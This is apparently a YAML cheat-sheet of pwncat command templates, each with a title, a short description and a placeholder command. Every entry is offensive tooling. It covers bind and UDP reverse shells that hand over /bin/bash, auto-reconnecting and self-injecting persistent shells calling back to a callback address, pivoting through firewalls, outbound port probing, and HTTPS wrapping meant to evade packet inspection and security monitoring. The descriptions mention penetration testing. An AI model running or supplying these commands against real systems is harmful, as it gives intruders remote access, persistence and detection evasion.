# === BASIC MODES (LISTEN & CONNECT) ===
 - title: pwncat - basic tcp listener
   desc: |
     Starts a standard TCP listener on a specified port. This is the primary way 
     to wait for incoming connections from a remote host. By default, the 
     server will terminate once the client disconnects or the session ends.
   command: "pwncat -l {{port|4444}}"

 - title: pwncat - basic tcp client connection
   desc: |
     Initiates a TCP connection to a remote host and port. This is used to connect 
     to a listening service or a bind shell on a target machine. It acts as a 
     standard network client similar to netcat.
   command: "pwncat {{hostname}} {{port|4444}}"

 - title: pwncat - bind shell listener
   desc: |
     Starts a listener and executes a shell command when a client connects. 
     This effectively creates a bind shell on the machine where this command is run. 
     Use this with caution as it provides remote access to the system's command line.
   command: "pwncat -l {{port|4444}} -e {{shell|/bin/bash}}"

# === PERSISTENCE & RELIABILITY ===
 - title: pwncat - persistent listener (keep-open)
   desc: |
     Starts a TCP listener that stays open and accepts new connections even 
     after a client disconnects. The -k or --keep-open flag prevents the 
     process from exiting when the first session is closed. This is essential 
     for maintaining a steady entry point during a penetration test.
   command: "pwncat -l -k {{port|4444}}"

 - title: pwncat - automatic client reconnection
   desc: |
     Attempts to connect to a remote host and automatically retries if the 
     connection is refused or dropped. The --reconn flag can be followed by 
     a number for specific retries or left empty for infinite attempts. 
     This ensures a reverse shell remains active through network instability.
   command: "pwncat {{hostname}} {{port|4444}} --reconn --reconn-wait {{seconds|5}}"

 - title: pwncat - listener with rebind on failure
   desc: |
     Instructs the server to attempt to re-bind to the port if the initial 
     attempt fails. This is useful in scenarios where a port might be 
     temporarily locked by the OS or another process. You can specify 
     how many times to retry before the tool gives up.
   command: "pwncat -l {{port|4444}} --rebind {{retry_count|10}} --rebind-wait {{seconds|2}}"

# === PORT SCANNING (ZERO-I/O) ===
 - title: pwncat - port scanning with banner grabbing
   desc: |
     Scans a range of ports on a target host using Zero-I/O mode. The --banner 
     flag attempts to capture the service banner for version detection. 
     You can specify port ranges using hyphens or lists using commas 
     to quickly identify open services.
   command: "pwncat -z {{hostname}} {{port_range|1-1024}} --banner"

# === PORT FORWARDING & PIVOTING ===
 - title: pwncat - local port forwarding
   desc: |
     Maps a local port to a remote service through an internal pwncat proxy. 
     This allows you to access services on a remote network that are 
     otherwise blocked by firewalls. Traffic sent to the local port 
     is tunneled directly to the specified destination.
   command: "pwncat -L {{local_addr|127.0.0.1}}:{{local_port|8080}} {{remote_host}} {{remote_port|80}}"

 - title: pwncat - remote port forwarding
   desc: |
     Establishes two internal clients to proxy traffic between a target and 
     a remote pwncat server. This mode is ideal for bypassing strict 
     inbound firewall rules by initiating an outbound connection. It 
     effectively pushes access to an internal service out to your listener.
   command: "pwncat -R {{remote_listener_ip}}:{{remote_listener_port}} {{target_host}} {{target_port}}"

# === EVASION & ADVANCED PROTOCOLS ===
 - title: pwncat - traffic masking with http/https
   desc: |
     Wraps the communication in HTTP or HTTPS packets to evade Deep Packet 
     Inspection (DPI) and firewall filters. This makes the connection 
     appear as legitimate web traffic to security monitoring tools. 
     Custom headers can be added to further mimic real browser requests.
   command: "pwncat --{{protocol|https}} --header \"User-Agent: Mozilla/5.0\" {{hostname}} {{port|443}}"

 - title: pwncat - udp reverse shell with ping init
   desc: |
     Creates a reverse shell over the UDP protocol, which is stateless. 
     The --ping-init flag is required so the listener can discover the 
     client's IP address and start communicating. This is useful for 
     environments where TCP traffic is heavily monitored or restricted.
   command: "pwncat {{hostname}} {{port|4444}} -u --ping-init --ping-intvl {{seconds|10}} -e {{shell|/bin/bash}}"

 - title: pwncat - outbound port probing (port robin)
   desc: |
     Attempts to connect to a list of ports in a round-robin fashion to 
     identify which outbound ports are permitted by a firewall. This 
     is combined with the --reconn-robin flag to cycle through 
     different destination ports until a connection is successful.
   command: "pwncat {{hostname}} {{port|4444}} --reconn --reconn-robin {{port_list|80,443,53,8080}}"

 - title: pwncat - automatic self-injection (experimental)
   desc: |
     Automatically deploys a persistent pwncat reverse shell once a 
     connection is received. This replaces a simple shell (like bash) 
     with a fully featured pwncat instance that connects back to 
     your specified address. This is currently an experimental feature 
     limited to Linux remote hosts.
   command: "pwncat -l {{port|4444}} --self-inject {{shell|/bin/bash}}:{{callback_ip}}:{{callback_port|4445}}"
